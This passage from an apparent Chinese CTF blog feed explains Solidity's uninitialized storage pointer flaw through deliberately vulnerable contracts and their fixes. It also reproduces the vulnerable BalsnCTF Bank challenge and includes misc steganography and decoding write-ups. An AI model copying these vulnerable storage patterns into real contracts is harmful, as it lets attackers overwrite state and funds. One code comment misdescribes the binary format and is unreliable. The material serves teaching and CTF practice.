comment">// offset for "one"</span><span class="token number">12</span><span class="token operator">-</span> <span class="token number">0x00000000000000000000000000000000000000000000000000000000000000a0</span> <span class="token comment">// offset for "two"</span><span class="token number">13</span><span class="token operator">-</span> <span class="token number">0x00000000000000000000000000000000000000000000000000000000000000e0</span> <span class="token comment">// offset for "three"</span><span class="token number">14</span><span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000003</span> <span class="token comment">// count for "one"</span><span class="token number">15</span><span class="token operator">-</span> <span class="token number">0x6f6e650000000000000000000000000000000000000000000000000000000000</span> <span class="token comment">// encoding of "one"</span><span class="token number">16</span><span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000003</span> <span class="token comment">// count for "two"</span><span class="token number">17</span><span class="token operator">-</span> <span class="token number">0x74776f0000000000000000000000000000000000000000000000000000000000</span> <span class="token comment">// encoding of "two"</span><span class="token number">18</span><span class="token operator">-</span> <span class="token number">0x0000000000000000000000000000000000000000000000000000000000000005</span> <span class="token comment">// count for "three"</span><span class="token number">19</span><span class="token operator">-</span> <span class="token number">0x7468726565000000000000000000000000000000000000000000000000000000</span> <span class="token comment">// encoding of "three"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Uninitialized Storage Pointer</title>
      <link href="/2023/11/09/Uninitialized-Storage-Pointer/"/>
      <url>/2023/11/09/Uninitialized-Storage-Pointer/</url>
      
        <content type="html"><![CDATA[<h3 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h3><p>未初始化的存储指针是指在EVM中未进行初始化的storage变量，这个变量会指向其他变量的区域，从而改变其他变量的值。</p><h3 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.24</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">example1</span><span class="token punctuation">&#123;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> a<span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> b<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">Wallet</span><span class="token punctuation">&#123;</span>        <span class="token builtin">uint</span> value<span class="token punctuation">;</span>        <span class="token builtin">address</span> addr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">setValue</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _a<span class="token punctuation">,</span><span class="token builtin">address</span> _b<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        a <span class="token operator">=</span> _a<span class="token punctuation">;</span>        b <span class="token operator">=</span> _b<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _value<span class="token punctuation">,</span> <span class="token builtin">address</span> _addr<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        Wallet wallet<span class="token punctuation">;</span>        wallet<span class="token punctuation">.</span>value <span class="token operator">=</span> _value<span class="token punctuation">;</span>        wallet<span class="token punctuation">.</span>addr <span class="token operator">=</span> _addr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在setValue设置（1  ,0x10aA1C20aD710B823f8c1508cfC12D5d1199117E）</p><p>这时发现a，b分别为 1  ,0x10aA1C20aD710B823f8c1508cfC12D5d1199117E</p><p>但是当 attack设置（3  ,0xa3b0D4BBF17F38e00F68Ce73f81D122FB1374ff6）</p><p>a和b也就变为了 3  ,0xa3b0D4BBF17F38e00F68Ce73f81D122FB1374ff6</p><p>这是因为在函数内部申明一个变量，通常默认是局部变量。但是Solidity的处理有些问题，在此处反直觉地默认让引用类型（Reference Type）变量，所以存储位置为storage。并且对于未初始化的storage 指针（类似传统语言中的空指针），Solidity 默认其指向 storage 的起始地址，即指向合约开头定义的状态变量。</p><p>也就是说，a指向slot0，b指向slot1.同时， wallet.value指向slot0，wallet.addr指向slot1。</p><p>同理，数组也有同样的问题。</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> someVariable<span class="token punctuation">;</span>    <span class="token builtin">uint</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token builtin">uint</span><span class="token punctuation">[</span><span class="token punctuation">]</span> x<span class="token punctuation">;</span>        x<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        data <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>x与someVariable的指向相同。</p><h3 id="修复"><a class="markdownIt-Anchor" href="#修复"></a> 修复</h3><p>实际上，这个问题只存在于solidity0.5.0之前的版本，编译器版本为0.4.26的话，报的还只是一个warning，不影响deploy；在下一个版本，0.5.0里面就变成了报error：</p><p>对于结构体，需要使用mapping对结构体进行初始化，并使用storage进行拷贝。</p><p>在 Solidity 中，一个未初始化的结构体并不会占用存储插槽。只有在对结构体进行实例化后，它才会占用实际的存储空间。</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.24</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">example1</span><span class="token punctuation">&#123;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> a<span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> b<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">Wallet</span><span class="token punctuation">&#123;</span>        <span class="token builtin">uint</span> value<span class="token punctuation">;</span>        <span class="token builtin">address</span> addr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">mapping</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token operator">=></span>Wallet<span class="token punctuation">)</span>wallets<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">setValue</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _a<span class="token punctuation">,</span><span class="token builtin">address</span> _b<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        a <span class="token operator">=</span> _a<span class="token punctuation">;</span>        b <span class="token operator">=</span> _b<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _id<span class="token punctuation">,</span><span class="token builtin">uint</span> _value<span class="token punctuation">,</span> <span class="token builtin">address</span> _addr<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        Wallet <span class="token keyword">storage</span> wallet<span class="token operator">=</span>wallets<span class="token punctuation">[</span>_id<span class="token punctuation">]</span><span class="token punctuation">;</span>        wallet<span class="token punctuation">.</span>value <span class="token operator">=</span> _value<span class="token punctuation">;</span>        wallet<span class="token punctuation">.</span>addr <span class="token operator">=</span> _addr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数组的修复，则是在生命变量的时候对其初始化操作：</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> someVariable<span class="token punctuation">;</span>    <span class="token builtin">uint</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token builtin">uint</span><span class="token punctuation">[</span><span class="token punctuation">]</span> x<span class="token operator">=</span>data<span class="token punctuation">;</span>        x<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        data <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2019-balsnctf-bank"><a class="markdownIt-Anchor" href="#2019-balsnctf-bank"></a> 2019 BalsnCTF Bank</h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.24</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Bank</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">event</span> <span class="token function">SendEther</span><span class="token punctuation">(</span><span class="token builtin">address</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">event</span> <span class="token function">SendFlag</span><span class="token punctuation">(</span><span class="token builtin">address</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>    <span class="token builtin">uint</span> randomNumber <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">struct</span> <span class="token class-name">SafeBox</span> <span class="token punctuation">&#123;</span>        <span class="token builtin">bool</span> done<span class="token punctuation">;</span>        <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">,</span> <span class="token builtin">bytes12</span><span class="token punctuation">)</span> <span class="token keyword">internal</span> callback<span class="token punctuation">;</span>        <span class="token builtin">bytes12</span> hash<span class="token punctuation">;</span>        <span class="token builtin">uint</span> value<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    SafeBox<span class="token punctuation">[</span><span class="token punctuation">]</span> safeboxes<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">FailedAttempt</span> <span class="token punctuation">&#123;</span>        <span class="token builtin">uint</span> idx<span class="token punctuation">;</span>        <span class="token builtin">uint</span> time<span class="token punctuation">;</span>        <span class="token builtin">bytes12</span> triedPass<span class="token punctuation">;</span>        <span class="token builtin">address</span> origin<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> FailedAttempt<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> failedLogs<span class="token punctuation">;</span>    <span class="token keyword">modifier</span> <span class="token function">onlyPass</span><span class="token punctuation">(</span><span class="token builtin">uint</span> idx<span class="token punctuation">,</span> <span class="token builtin">bytes12</span> pass<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">bytes12</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span>pass<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> safeboxes<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">.</span>hash<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            FailedAttempt info<span class="token punctuation">;</span>            info<span class="token punctuation">.</span>idx <span class="token operator">=</span> idx<span class="token punctuation">;</span>            info<span class="token punctuation">.</span>time <span class="token operator">=</span> now<span class="token punctuation">;</span>            info<span class="token punctuation">.</span>triedPass <span class="token operator">=</span> pass<span class="token punctuation">;</span>            info<span class="token punctuation">.</span>origin <span class="token operator">=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">;</span>            failedLogs<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">_</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">deposit</span><span class="token punctuation">(</span><span class="token builtin">bytes12</span> hash<span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token keyword">public</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        SafeBox box<span class="token punctuation">;</span>        box<span class="token punctuation">.</span>done <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        box<span class="token punctuation">.</span>hash <span class="token operator">=</span> hash<span class="token punctuation">;</span>        box<span class="token punctuation">.</span>value <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            box<span class="token punctuation">.</span>callback <span class="token operator">=</span> sendFlag<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">>=</span> <span class="token number">1</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>            box<span class="token punctuation">.</span>value <span class="token operator">-=</span> <span class="token number">0.01</span> ether<span class="token punctuation">;</span>            box<span class="token punctuation">.</span>callback <span class="token operator">=</span> sendEther<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        safeboxes<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>box<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> safeboxes<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint</span> idx<span class="token punctuation">,</span> <span class="token builtin">bytes12</span> pass<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        SafeBox box <span class="token operator">=</span> safeboxes<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token operator">!</span>box<span class="token punctuation">.</span>done<span class="token punctuation">)</span><span class="token punctuation">;</span>        box<span class="token punctuation">.</span><span class="token function">callback</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> pass<span class="token punctuation">)</span><span class="token punctuation">;</span>        box<span class="token punctuation">.</span>done <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">sendEther</span><span class="token punctuation">(</span><span class="token builtin">uint</span> idx<span class="token punctuation">,</span> <span class="token builtin">bytes12</span> pass<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token function">onlyPass</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> pass<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>safeboxes<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">SendEther</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">sendFlag</span><span class="token punctuation">(</span><span class="token builtin">uint</span> idx<span class="token punctuation">,</span> <span class="token builtin">bytes12</span> pass<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token function">onlyPass</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> pass<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">>=</span> <span class="token number">100000000</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">SendFlag</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span>owner<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF 刷题</title>
      <link href="/2023/11/06/NSSCTF-%E5%88%B7%E9%A2%98/"/>
      <url>/2023/11/06/NSSCTF-%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="utctf-2020zero"><a class="markdownIt-Anchor" href="#utctf-2020zero"></a> [UTCTF 2020]Zero</h3><p>得到附件打开得到</p><p>Lorem ipsum dolor ‌‌‌‌‍﻿‍‍sit amet‌‌‌‌‍﻿‍‌, consectetur adipiscing‌‌‌‌‍‬‍‬ elit.‌‌‌‌‍‬﻿‌‌‌‌‌‍‬‌‍ Phasellus quis tempus ante, nec vehicula mi. ‌‌‌‌‍‬‍﻿Aliquam nec‌‌‌‌‍﻿‬﻿ nisi ut neque interdum auctor.‌‌‌‌‍﻿‍﻿ Aliquam felis ‌‌‌‌‍‬‬‌orci, vestibulum ‌‌‌‌‍﻿‬‍sit amet ante‌‌‌‌‍‌﻿‬ at, consectetur‌‌‌‌‍‌﻿﻿ lobortis eros.‌‌‌‌‍‍‍‌ ‌‌‌‌‍‌‌‌Orci varius natoque ‌‌‌‌‍﻿‌﻿penatibus et ‌‌‌‌‍‬‌﻿magnis‌‌‌‌‌﻿‌‍‌‌‌‌‌﻿‌‍ dis ‌‌‌‌‍‍﻿﻿parturient montes, nascetur ridiculus ‌‌‌‌‌﻿‍‌‌‌‌‌‌﻿‬‍mus. In finibus‌‌‌‌‌﻿‌‬ magna‌‌‌‌‌﻿‍﻿ mauris, quis‌‌‌‌‍‬‌‍ auctor ‌‌‌‌‍‬‌‍libero congue quis. ‌‌‌‌‍‬‬‬Duis‌‌‌‌‍‬‌‬ sagittis consequat urna non tristique. Pellentesque eu lorem ‌‌‌‌‍﻿‌‍id‌‌‌‌‍‬‬﻿ quam vestibulum ultricies vel ac purus‌‌‌‌‌﻿‌‍.‌‌‌‌‌﻿‍‌‌‌‌‌‍﻿﻿‍</p><p>放在kali里面，用vim打开该txt文件，果然发现许多不可见字符，就判断为零宽字符，在线解密得到flag。</p><h3 id="nisactf-2022为什么我什么都看不见"><a class="markdownIt-Anchor" href="#nisactf-2022为什么我什么都看不见"></a> [NISACTF 2022]为什么我什么都看不见</h3><p>打开附件后，放到010中发现文件头出现错误，补齐文件头。先用binwalk分析，得到rar文件，却什么都没有，后来分析，发现是；lsb隐写，最低位隐写即可。</p><h3 id="litctf-2023两仪生四象-中级"><a class="markdownIt-Anchor" href="#litctf-2023两仪生四象-中级"></a> [LitCTF 2023]两仪生四象 (中级)</h3><p>题目直接给了一个程序。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">_hash <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"乾"</span><span class="token punctuation">:</span> <span class="token string">"111"</span><span class="token punctuation">,</span> <span class="token string">"兑"</span><span class="token punctuation">:</span> <span class="token string">"011"</span><span class="token punctuation">,</span> <span class="token string">"离"</span><span class="token punctuation">:</span> <span class="token string">"101"</span><span class="token punctuation">,</span> <span class="token string">"震"</span><span class="token punctuation">:</span> <span class="token string">"001"</span><span class="token punctuation">,</span> <span class="token string">"巽"</span><span class="token punctuation">:</span> <span class="token string">"110"</span><span class="token punctuation">,</span> <span class="token string">"坎"</span><span class="token punctuation">:</span> <span class="token string">"010"</span><span class="token punctuation">,</span> <span class="token string">"艮"</span><span class="token punctuation">:</span> <span class="token string">"100"</span><span class="token punctuation">,</span> <span class="token string">"坤"</span><span class="token punctuation">:</span> <span class="token string">"000"</span><span class="token punctuation">&#125;</span>_reverse_hash <span class="token operator">=</span> <span class="token punctuation">&#123;</span>v<span class="token punctuation">:</span> k <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> _hash<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>text <span class="token operator">=</span> <span class="token string">"LitCTF&#123;*********&#125;"</span>text <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>binary_text <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'010b'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> text<span class="token punctuation">)</span><span class="token comment">#format(ord(c), '010b') 的作用是将它的ASCII码转换成8位二进制数字，前面加零以保证每个二进制数字的长度都是3位。然后，使用''.join()将所有二进制数字连接在一起，以获得整个字符串的二进制编码表示。</span>encoded_text <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>binary_text<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        encoded_text <span class="token operator">+=</span> _reverse_hash<span class="token punctuation">[</span>binary_text<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token keyword">except</span> KeyError<span class="token punctuation">:</span>        encoded_text <span class="token operator">+=</span> <span class="token string">" "</span><span class="token keyword">print</span><span class="token punctuation">(</span>encoded_text<span class="token punctuation">)</span><span class="token triple-quoted-string string">""" encoded_text = "坤乾兑艮兑坎坤坤巽震坤巽震艮兑坎坤震兑乾坤巽坤艮兑震巽坤巽艮坤巽艮艮兑兑艮震兑乾坤乾坤坤兑艮艮坤巽坤坤巽坎坤兑离坎震艮兑坤巽坎艮兑震坤震兑乾坤乾坎坤兑坎坤震艮离坤离乾艮震艮巽震离震坤巽兑艮兑坎坤震巽艮坤离乾艮坎离坤震巽坎坤兑坤艮兑震巽震巽坎坤巽坤艮兑兑坎震巽兑" """</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码是对二进制字符串进行解码的过程。在循环中，每次处理三个字符，也就是一个汉字对应的三个二进制数字。如果这三个数字是有效的，即它们对应的八卦名称在_reverse_hash字典中有定义，那么就将这个八卦名称添加到已解密的字符串Encoded_text中；否则，就添加一个空格。</p><p>这个过程中使用了异常处理机制。如果一个二进制字符串无法找到相应的八卦名称，_reverse_hash[binary_text[i:i+3]]操作将会引发一个KeyError异常。在这种情况下，程序将在字符串encoded_text中添加一个空格，以便在最终解密结果中保留二进制字符串中无法解密的部分位置，并且不会中断整个程序的执行。</p><p>最终，经过循环处理和异常处理，我们就可以获得解密后的明文字符串，它被存储在encoded_text变量中。</p><p>脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">_hash <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"乾"</span><span class="token punctuation">:</span> <span class="token string">"111"</span><span class="token punctuation">,</span> <span class="token string">"兑"</span><span class="token punctuation">:</span> <span class="token string">"011"</span><span class="token punctuation">,</span> <span class="token string">"离"</span><span class="token punctuation">:</span> <span class="token string">"101"</span><span class="token punctuation">,</span> <span class="token string">"震"</span><span class="token punctuation">:</span> <span class="token string">"001"</span><span class="token punctuation">,</span> <span class="token string">"巽"</span><span class="token punctuation">:</span> <span class="token string">"110"</span><span class="token punctuation">,</span> <span class="token string">"坎"</span><span class="token punctuation">:</span> <span class="token string">"010"</span><span class="token punctuation">,</span> <span class="token string">"艮"</span><span class="token punctuation">:</span> <span class="token string">"100"</span><span class="token punctuation">,</span> <span class="token string">"坤"</span><span class="token punctuation">:</span> <span class="token string">"000"</span><span class="token punctuation">&#125;</span>encoded_text <span class="token operator">=</span> <span class="token string">"坤乾兑艮兑坎坤坤巽震坤巽震艮兑坎坤震兑乾坤巽坤艮兑震巽坤巽艮坤巽艮艮兑兑艮震兑乾坤乾坤坤兑艮艮坤巽坤坤巽坎坤兑离坎震艮兑坤巽坎艮兑震坤震兑乾坤乾坎坤兑坎坤震艮离坤离乾艮震艮巽震离震坤巽兑艮兑坎坤震巽艮坤离乾艮坎离坤震巽坎坤兑坤艮兑震巽震巽坎坤巽坤艮兑兑坎震巽兑"</span>text <span class="token operator">=</span> <span class="token string">''</span>binary_text <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> char <span class="token keyword">in</span> encoded_text<span class="token punctuation">:</span>    binary_text <span class="token operator">+=</span> _hash<span class="token punctuation">[</span>char<span class="token punctuation">]</span>formatted_binary_text <span class="token operator">=</span> <span class="token string">" "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>binary_text<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>binary_text<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>formatted_binary_text<span class="token punctuation">)</span><span class="token comment"># 0001110111 0001101000 0000110001 0001100011 0001101000 0001011111 0001100001 0001100111 0000110100 0001101001 0001101110 0001011111 0001110000 0001110010 0000110000 0001100100 0001110101 0001100011 0001100101 0001100100 0001011111 0001110100 0001101000 0001100101 0001011111 0000110011 0001101001 0001100111 0001101000 0001110100 0001011111 0001010100 0001110010 0000110001 0001100111 0001110010 0001100001 0001101101 0001110011</span><span 